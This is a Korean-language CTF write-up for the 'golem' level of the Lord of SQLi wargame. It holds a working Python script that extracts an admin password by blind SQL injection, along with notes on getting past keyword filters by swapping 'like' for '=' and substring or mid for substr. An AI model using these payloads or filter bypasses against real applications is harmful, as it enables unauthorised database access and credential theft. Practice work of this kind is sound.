# Payload
```python
import requests
import time
import string
import sys

URL = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
CHARSET = string.digits +string.ascii_lowercase
MAX_LEN = 1000
COOKIES = {"PHPSESSID": "ql3tqlmum5mkma8kd3as04ppph"}

for i in range(1, MAX_LEN):
    payload = f"0' || id like'admin' && length(pw) < {i+1} -- '"
    payload.replace("&", "%26")
    r = requests.get(
        URL,
        params={"pw": payload},
        cookies=COOKIES
    )
    print(f"Trying length {i}...")
    if(r.text.count("Hello") >= 2):
        print(f"[Found] Password length is {i}")
        MAX_LEN = i
        break

def extract_password():
    found = ""
    for pos in range(1, MAX_LEN + 1):
        matched = False
        for ch in CHARSET:
            lo = chr(ord(ch)-1)
            hi = chr(ord(ch)+1)
            # payload = f"0' || id like 'admin' && substring(pw,{pos},1) like '{ch}' -- '"
            payload = f"0' || id like 'admin' && '{lo}' < substring(pw,{pos},1) && substring(pw,{pos},1) < '{hi}' -- '"
            # payload = payload.replace("&", "%26")
            try:
                r = requests.get(URL, params={"pw": payload}, timeout=10, cookies=COOKIES)
                print(f"현재 시도중: payload = {payload}, pos={pos}, ch='{ch}'", end='\n', flush=True)
                print(f"Full URL: {r.url}", end='\r', flush=True)
            except Exception as e:
                print(f"요청 실패: {e}", file=sys.stderr)
                return False
            # "Hello"가 두 번 이상이면 조건이 참이라고 판단
            if r.text.count("Hello") >= 2:
                found += ch
                matched = True
                print(f"pos {pos}: {ch} (현재: {found})")
                break

        if not matched:
            print(f"문자 없음(pos={pos}). 비밀번호 추출 종료.")
            break
    return found

if __name__ == "__main__":
    print("시작: Blind SQLi 문자 추출")
    pwd = extract_password()
    print(f"추출된 비밀번호: {pwd}")
```
- SQL 관련해서 동작하는지 확신이 들지 않는다면 https://onecompiler.com/mysql
- 직접 서버 환경을 구축하거나, 온라인에서 간단하게 테스트 해보는 것이 가장 좋다.
- 정규표현식으로 `or`, `and`, `substr(`, `=` 문자를 필터링 하고 있어서 substr() 함수와 직접적인 대입은 불가능하다.
	- substr() 함수는 substring() 함수와 mid() 함수로 대체 가능하다.
	- `=` 연산자는 like 문구로 대체 가능하다.
		- 또는 범위를 좁게 지정한 대소비교로도 지정 가능하지만 페이로드가 길어진다.
- 31번째 줄 또는 32번째 줄 둘 중 하나만 사용하여 익스플로잇이 가능하다.
- mysql에서 hex() 함수를 실행해도 앞에 0x를 붙이지 않고, 그냥 문자열로 출력하기 때문에 이걸 16진수랑 직접 비교하면 값 비교가 잘못 일어나게 된다.
- 대체 가능한 mysql 함수들
	- substr
	- substring
	- mid / left / right / lpad / rpad
	- locate / regexp / position / rlike / insert
- 